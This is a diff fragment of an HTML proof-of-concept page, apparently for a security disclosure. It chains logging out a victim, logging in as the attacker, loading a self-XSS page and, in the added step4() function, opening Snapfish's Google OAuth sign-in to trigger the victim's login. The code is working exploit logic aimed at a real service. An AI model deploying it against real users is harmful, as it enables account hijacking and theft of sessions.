@@ -47,11 +47,17 @@
             setTimeout(() => {handle2.location = goauth_url}, 15000);
         }
 
+        function step4(){
+            const goauth_url= "https://www.snapfish.com/v1/gw/snapfish/oauth/google/signin?TNCFlag=1&context=/hp/sf/sf-us/snapfish-us&sourceGroup=sf-store&code=1"
+            const handle2 = window.open(goauth_url,"");
+        }
+
     </script>
     <form action="#">
         <input type="button" value="Step 1" onclick="step1();" /> : Logout the Victim <br />
         <input type="button" value="Step 2" onclick="step2();" /> : Login as the Attacker <br />
         <input type="button" value="Step 3" onclick="step3();" /> : Load the self XSS page <br />
+        <input type="button" value="Step 4" onclick="step4();" /> : Trigger the connexion of victim <br />
     </form>
 </body>
 
